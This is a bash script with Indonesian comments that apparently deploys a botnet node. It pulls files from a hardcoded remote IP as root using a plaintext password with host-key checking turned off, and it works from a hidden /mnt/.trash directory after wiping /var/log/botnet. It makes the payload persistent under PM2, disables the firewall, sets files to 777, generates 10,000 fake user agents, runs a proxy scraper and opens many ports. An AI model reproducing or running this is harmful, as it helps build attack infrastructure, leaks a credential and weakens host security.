#!/bin/bash

# Cek apakah proses PM2 bernama 'main' berjalan
pm2 describe main > /dev/null
if [ $? -eq 0 ]; then
    echo "Proses 'main' ditemukan, menghapus proses PM2 'main'"
    pm2 delete main
else
    echo "Proses 'main' tidak ditemukan, lanjut ke perintah berikutnya"
fi

# Install paket yang diperlukan
DEBIAN_FRONTEND=noninteractive apt install -y sshpass npm nodejs build-essential squid

# Membersihkan dan menyiapkan direktori
rm -rf /mnt/.trash
rm -rf /var/log/botnet
mkdir /mnt/.trash
cd /mnt/.trash

# Memindahkan file dengan scp
sshpass -p 'lex' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@159.223.47.71:/root/file/* ./

# Menginstal NVM dan Node.js
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
nvm install node || echo 'Node.js sudah terpasang'

# Instalasi npm dan pm2
npm rebuild
npm install
npm install -g pm2
pm2 stop all || echo 'Tidak ada layanan PM2 yang sedang berjalan'
pm2 start main.js
pm2 startup
pm2 save
pm2 restart all

# Mengatur firewall
ufw disable
ufw reload

# Menjalankan skrip perbaikan
cd ./lib/cache
chmod 777 *

# Memulai proses di screen
cd ../..
node ./lib/cache/uagen.js 10000 ua.txt
python3 ./lib/cache/scrape.py

# Mengatur firewall untuk port yang diperlukan
ufw allow 4343
ufw allow 1201
ufw allow 812
ufw allow 22
ufw allow 443
ufw allow 80
ufw allow 2022
ufw allow 3306
ufw allow 8080
ufw reload
